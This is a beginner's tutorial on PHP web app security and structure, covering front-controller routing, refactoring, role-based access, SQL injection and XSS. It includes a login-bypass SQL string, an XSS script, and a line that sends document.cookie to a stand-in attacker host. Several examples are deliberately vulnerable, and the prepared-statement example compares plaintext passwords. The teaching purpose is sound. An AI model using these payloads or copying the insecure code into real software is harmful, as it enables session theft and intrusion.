# Less Points of Entry and Better Organization

## 👌Single Entry Point

###  What is the problem....??
Without control, users can access files directly by typing the file name in the URL.

Examples:
- `/posts.php`
- `/login.php`
- `/signup.php`

This is not secure and makes the project structure messy because every file is directly accessible.

###  How to fix it?
We make `index.php` the only entry point for the whole project.
All requests must pass through it first.

###  Using Clean URL with `.htaccess`
We use `.htaccess` to rewrite URLs and redirect all requests to `index.php`.

```apache
RewriteEngine On

RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d

RewriteRule ^(.*)$ index.php?url=$1 [L,QSA]
```

###  How it works?
Now when a user writes:

`/posts`

It becomes:

`index.php?url=posts`

-  Everything goes through `index.php`
-  `index.php` decides which page to load

---


## 👌Refactor the Code (Segmented Code)

###  What is the problem?
The same code is repeated in many files.

For example:
- database connection code is written in every page
- query code is repeated in different files

This makes the project:
- hard to maintain
- difficult to update
- messy and not organized

If we change something, we must update it in many places.

###  Example (Before refactoring)

```php
<?php

// connect to database
$con = mysqli_connect("localhost", "root", "", "security_db");

if (!$con) {
    die("Could not connect to the database");
}

// get posts
$query = "SELECT * FROM posts ORDER BY id DESC LIMIT 2";
$result = mysqli_query($con, $query);

while ($row = mysqli_fetch_assoc($result)) {
    echo $row['title'];
    echo $row['content'];
}
```

###  How to prevent it?
Move repeated code into one file.
Create a file called `functions.php` inside a `private` folder.
Put reusable code inside functions.
Include this file in other pages.
Use functions instead of repeating code.

###  Recommended Structure

```
private/
    functions.php

public/
    index.php
    home.php
```

### `functions.php` (After refactor)

```php
<?php

function connect()
{
    $con = mysqli_connect("localhost", "root", "", "security_db");

    if (!$con) {
        die("Could not connect to the database");
    }

    return $con;
}

function db_read($query)
{
    $con = connect();
    $result = mysqli_query($con, $query);

    $data = [];

    while ($row = mysqli_fetch_assoc($result)) {
        $data[] = $row;
    }

    return $data;
}
```

###  Result
- Less repeated code
- Easier to edit
- Cleaner project
- Better organization

---

## 👌 Factory with OOP

###  How it works?
We use OOP to organize the code and avoid repeating the same logic.
Database code is written once inside a `Database` class.
Other classes reuse it using `extends`.
Each class handles its own job (for example: posts).

This makes the code:
- clean
- easy to maintain
- easy to debug

If there is a problem, you can easily know:
- which class
- which function

###  Example Code

```php
<?php

class Database
{
    protected function connect()
    {
        $con = mysqli_connect("localhost", "root", "", "security_db");

        if (!$con) {
            die("Could not connect to the database");
        }

        return $con;
    }

    protected function db_read($query)
    {
        $con = $this->connect();
        $result = mysqli_query($con, $query);

        $data = [];

        while ($row = mysqli_fetch_assoc($result)) {
            $data[] = $row;
        }

        return $data;
    }
}

class Post extends Database
{
    public function get_home_posts()
    {
        return $this->db_read("SELECT * FROM posts ORDER BY id DESC LIMIT 2");
    }

    public function get_all_posts()
    {
        return $this->db_read("SELECT * FROM posts ORDER BY id DESC");
    }

    public function get_one_post($id)
    {
        return $this->db_read("SELECT * FROM posts WHERE id = '" . mysqli_real_escape_string($this->connect(), $id) . "' LIMIT 1");
    }
}
```

###  Why this is better
- Database logic is centralized
- Post logic is separated into its own class
- No duplicate connection or query code in multiple files
- It is easier to extend with more classes later

---

## `index.php` as the controller

Use `index.php` to route requests and load only allowed pages.

```php
<?php

require_once __DIR__ . '/../private/functions.php';

$page = isset($_GET['page']) ? $_GET['page'] : 'home';
$allowedPages = ['home', 'posts', 'login', 'signup'];

if (in_array($page, $allowedPages, true)) {
    require __DIR__ . '/pages/' . $page . '.php';
} else {
    require __DIR__ . '/pages/404.php';
}
```

This keeps the public surface small and makes the app easier to secure and maintain.

---

## What does `extends` mean?

In PHP, `extends` means one class inherits from another class.

Example:

```php
class Post extends Database
{
    public function get_one_post($id)
    {
        $query = "SELECT * FROM posts WHERE id = '$id' LIMIT 1";
        return $this->db_read($query);
    }
}
```

- `Post` inherits all the public and protected functions from `Database`
- `Post` can use `connect()` and `db_read()` without rewriting them
- This avoids repeated code and keeps the structure simple
- If `Database` changes, all child classes benefit automatically

### Result
- no repeated code
- simple structure
- easy to manage

---

## 👌Login Error Messaging

### What is login error messaging?
It is the message shown to the user when login fails.

In code, we often start with:

```php
$Error = "";
```

That means: there are no errors yet.

If the email is invalid:

```php
if (!filter_var($_POST['email'], FILTER_VALIDATE_EMAIL)) {
    $Error = "wrong email or password";
}
```

If the password is empty:

```php
if (empty($_POST['password'])) {
    $Error = "wrong email or password";
}
```

### Why use the same message?
- We do not give precise feedback to a hacker
- It improves security
- It prevents revealing whether email or password is wrong

Instead of:
- “email is wrong”
- “password is wrong”

We show:

`wrong email or password`

### How is the message displayed?

```php
if ($Error != "") {
    echo $Error;
}
```

If there is an error, it will be shown to the user.

---

## 👌Least Privilege

### What is the problem?
A user may have more access than they need.

Examples:
- An editor can open admin pages
- A normal user can access pages they are not allowed to use

This is dangerous because users can reach sensitive pages without permission.

### How to prevent it?
Control access based on user roles stored in the session.

Example:

```php
session_start();

function access($needed_rank)
{
    $user_rank = isset($_SESSION['user_rank']) ? $_SESSION['user_rank'] : "";

    switch ($needed_rank) {
        case 'admin':
            return in_array($user_rank, ['admin']);
        case 'editor':
            return in_array($user_rank, ['admin', 'editor']);
        case 'user':
            return in_array($user_rank, ['admin', 'editor', 'user']);
        default:
            return false;
    }
}
```

Use this function before loading any protected page.

---

## 👌 SQL Injection

### 👉POST SQL Injection

### 1) Email Validation

Problem:
- The user may enter invalid or non-email data.

Wrong code:

```php
$email = $_POST['email'];
```

How to prevent it:

```php
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    die("Invalid email");
}
```

### 2) `addslashes`

Problem:
- A single quote `'` can break the SQL query.

What `addslashes` does:
- It adds a backslash `\` before `'`
- Example: `john'` → `john\'`

Wrong code:

```php
$id = addslashes($id);
```

Note:
- It only handles quotes
- It is NOT strong protection against SQL Injection

### 3) Prepared Statements (Best Solution)

Problem:
- An attacker can inject SQL such as:

`' OR 1=1`

Result:
- Login bypass
- Access without valid credentials

Wrong code:

```php
$query = "SELECT * FROM users WHERE email = '$email' AND password = '$password'";
```

Best solution:

```php
$stmt = $pdo->prepare('SELECT * FROM users WHERE email = ? AND password = ?');
$stmt->execute([$email, $password]);
$user = $stmt->fetch();
```

###  👉GET SQL Injection

#### UNION SELECT Injection

Example class:

```php
class Post
{
    public $db;

    public function get_all_posts()
    {
        $query = "SELECT * FROM posts ORDER BY id DESC";
        return $this->db_read($query);
    }

    public function get_one_post($id)
    {
        $id = addslashes($id);

        $query = "SELECT * FROM posts WHERE id = '$id' LIMIT 1";

        echo $query;

        return $this->db_read($query);
    }
}
```

This code is still unsafe because it builds SQL with user input. The best fix is to use prepared statements or a proper query builder.

### Convert ID to integer

When the query uses an ID from the URL or input, convert it to an integer first.

```php
$id = (int) $id;

$query = "SELECT * FROM posts WHERE id = $id LIMIT 1";
```

This prevents SQL injection by removing any injected SQL from the ID value.

---

## 👉 Database Error Handling

### Concept
- On localhost: show detailed error for debugging
- On production: hide internal errors from users

 Example:

```php
try {
    // database code here
} catch (Exception $e) {
    if ($_SERVER['HTTP_HOST'] === 'localhost') {
        die($e->getMessage());
    } else {
        die('Could not connect to the database');
    }
}
```

This keeps development errors visible during testing while protecting internal details in production.

---

##  XSS (Cross Site Scripting)

### What is XSS?
XSS is a vulnerability where an attacker injects JavaScript code into a website, and it gets executed in the browser of other users.

### Example attack

```html
<script>alert('Hacked')</script>
```

If the website prints user input directly:

```php
echo $_POST['comment'];
```

 The script will run in the browser.

### Risks
- Execute JavaScript in users’ browsers
- Steal cookies (`document.cookie`)
- Redirect users to fake websites

Example cookie theft:

```js
fetch('http://attacker.com?cookie=' + document.cookie);
```

### How to prevent XSS
Use output escaping to convert HTML into safe text.

 Solution:

```php
echo htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
```

### How it works

HTML:

```html
<script>alert('Hacked')</script>
```

Becomes:

```html
&lt;script&gt;alert('Hacked')&lt;/script&gt;
```

✔️ Displayed as text
❌ Not executed

